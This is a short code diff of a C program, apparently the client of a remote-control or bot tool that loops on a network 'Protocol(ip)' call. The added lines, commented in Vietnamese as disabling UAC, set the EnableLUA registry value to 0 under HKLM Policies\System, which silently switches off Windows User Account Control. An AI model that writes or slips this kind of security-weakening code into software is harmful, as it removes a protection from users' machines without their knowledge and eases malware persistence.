@@ -737,8 +737,26 @@ int main()
 	//	printf("WSAStartup failed with error: %d\n", iResult);
 	//	return 1;
 	//}
-
-	//DNS(ip);
+	// tắt tính năng UAC trên window
+	DWORD val = 0;
+	HKEY uaKey;
+	RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_WRITE, &uaKey);
+	if (uaKey == NULL)
+	{
+		//Handle error message here
+	}
+	else
+	{
+		if (RegSetValueEx(uaKey, "EnableLUA", 0, REG_DWORD, (const BYTE *)&val, sizeof(val)) != ERROR_SUCCESS)
+		{
+			//Error
+		}
+		else
+		{
+			//Success
+		}
+		RegCloseKey(uaKey);
+	}
 	while (1) {
 		int protocol = Protocol(ip);
 		if (protocol == 2) {
